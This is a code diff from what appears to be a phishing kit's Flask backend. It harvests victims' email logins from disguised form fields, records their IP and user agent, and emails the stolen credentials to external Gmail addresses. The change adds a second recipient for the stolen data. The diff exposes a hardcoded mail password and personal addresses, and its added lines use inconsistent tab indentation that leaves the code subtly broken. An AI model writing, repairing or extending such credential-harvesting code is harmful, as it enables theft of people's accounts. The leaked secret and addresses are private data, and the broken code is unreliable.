@@ -147,7 +147,8 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "Sharqiavehicles@sharqiavehicles.com"
         sender_emaill = "Sharqiavehicles"
-        receiver_email = "lukeangus1989@gmail.com,bobxuchina.163@gmail.com"
+        receiver_email = "lukeangus1989@gmail.com"
+	receiver_email = "bobxuchina.163@gmail.com"
         password = "nB1+WcG_+djw"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -183,9 +184,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "Sharqiavehicles@sharqiavehicles.com,bobxuchina.163@gmail.com"
+        sender_email = "Sharqiavehicles@sharqiavehicles.com"
         sender_emaill = "Sharqiavehicles"
         receiver_email = "lukeangus1989@gmail.com"
+	receiver_email = "bobxuchina.163@gmail.com"
         password = "nB1+WcG_+djw"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
